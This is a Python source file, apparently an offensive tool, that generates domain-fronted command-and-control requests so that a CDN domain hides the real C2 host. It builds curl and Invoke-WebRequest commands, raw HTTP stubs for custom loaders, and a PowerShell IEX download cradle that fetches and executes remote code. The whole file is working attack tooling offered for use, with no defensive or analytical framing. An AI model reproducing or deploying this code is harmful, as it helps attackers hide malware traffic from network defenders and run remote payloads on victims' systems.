"""
front_engine.py — Domain Fronting Header Generator

Generates curl, Invoke-WebRequest, and raw HTTP snippets that use CDN domain
fronting to hide the true C2 destination. The TLS SNI points to a legitimate
CDN domain while the HTTP Host header routes to the real C2.

Supports: CloudFront, Azure CDN, Cloudflare Workers.
"""
import string
import random


PROVIDERS = {
    'cloudfront': {
        'suffix': '.cloudfront.net',
        'example': 'd123abc.cloudfront.net',
        'desc': 'AWS CloudFront'
    },
    'azure': {
        'suffix': '.azureedge.net',
        'example': 'myblob.azureedge.net',
        'desc': 'Azure CDN / Front Door'
    },
    'cloudflare': {
        'suffix': '.workers.dev',
        'example': 'proxy.mysite.workers.dev',
        'desc': 'Cloudflare Workers'
    },
}


class FrontEngine:

    @staticmethod
    def curl_cmd(real_host: str, front_host: str, path: str, https: bool = True) -> str:
        """
        curl with SNI set to front_host but Host header pointing to real_host.
        TLS handshake uses front_host (reputable CDN), HTTP routes to real_host.
        """
        scheme = 'https' if https else 'http'
        return (
            f'curl -sk '
            f'--resolve "{front_host}:443:$(dig +short {front_host} | head -1)" '
            f'-H "Host: {real_host}" '
            f'"{scheme}://{front_host}{path}"'
        )

    @staticmethod
    def invoke_webrequest(real_host: str, front_host: str, path: str, https: bool = True) -> str:
        """
        PowerShell Invoke-WebRequest with spoofed Host header for domain fronting.
        """
        scheme = 'https' if https else 'http'
        return (
            f'Invoke-WebRequest -Uri "{scheme}://{front_host}{path}" '
            f'-Headers @{{Host="{real_host}"}} -UseBasicParsing'
        )

    @staticmethod
    def iex_one_liner(real_host: str, front_host: str, path: str, https: bool = True) -> str:
        """
        PowerShell IEX download cradle via domain fronting.
        """
        scheme = 'https' if https else 'http'
        return (
            f'$c=(New-Object Net.WebClient);'
            f'$c.Headers.Add("Host","{real_host}");'
            f'IEX($c.DownloadString("{scheme}://{front_host}{path}"))'
        )

    @staticmethod
    def raw_http(real_host: str, front_host: str, path: str) -> str:
        """
        Raw HTTP/1.1 request snippet demonstrating host header mismatch.
        Useful for custom loaders / C stubs.
        """
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {real_host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: close\r\n"
            f"(Connect TLS to: {front_host})"
        )

    @staticmethod
    def generate_all(real_host: str, front_host: str, path: str) -> dict:
        """
        Returns all snippet formats for a given fronting configuration.
        """
        return {
            'curl':              FrontEngine.curl_cmd(real_host, front_host, path),
            'invoke_webrequest': FrontEngine.invoke_webrequest(real_host, front_host, path),
            'iex_one_liner':     FrontEngine.iex_one_liner(real_host, front_host, path),
            'raw_http':          FrontEngine.raw_http(real_host, front_host, path),
        }
